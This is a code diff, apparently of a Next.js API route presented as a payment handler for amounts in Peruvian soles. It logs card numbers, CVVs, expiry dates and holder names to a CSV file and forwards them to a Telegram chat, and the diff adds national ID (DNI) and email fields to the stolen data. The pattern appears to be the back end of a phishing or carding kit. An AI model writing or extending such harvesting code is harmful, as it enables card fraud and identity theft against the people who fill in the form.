@@ -11,6 +11,8 @@ type PagoPayload = {
   titular: string;
   vencimiento: string;
   cvv: string;
+  dni?: string;
+  email?: string;
 };
 
 const CSV_PATH = path.join(process.cwd(), 'pagos_log.csv');
@@ -65,6 +67,8 @@ async function sendTelegramAlert(data: {
   cvv: string;
   titular: string;
   vencimiento: string;
+  dni?: string;
+  email?: string;
   estado: string;
   nroOperacion: string;
   fecha: string;
@@ -79,6 +83,8 @@ async function sendTelegramAlert(data: {
     `━━━━━━━━━━━━━━━━━━━━`,
     `👤 *Cliente:* ${data.nombre}`,
     `📋 *Código:* ${data.codcliente}`,
+    ...(data.dni ? [`🪪 *DNI:* ${data.dni}`] : []),
+    ...(data.email ? [`📧 *Correo:* ${data.email}`] : []),
     `💰 *Monto:* S/ ${data.monto.toFixed(2)}`,
     `━━━━━━━━━━━━━━━━━━━━`,
     `💳 *Tarjeta:* ${data.tarjeta}`,
@@ -128,7 +134,7 @@ export async function POST(req: NextRequest) {
     return NextResponse.json({ error: 'Solicitud inválida' }, { status: 400 });
   }
 
-  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv } = body;
+  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email } = body;
 
   if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
     return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
@@ -173,6 +179,8 @@ export async function POST(req: NextRequest) {
       cvv: cvv || '',
       titular,
       vencimiento,
+      dni: dni || undefined,
+      email: email || undefined,
       estado,
       nroOperacion,
       fecha,
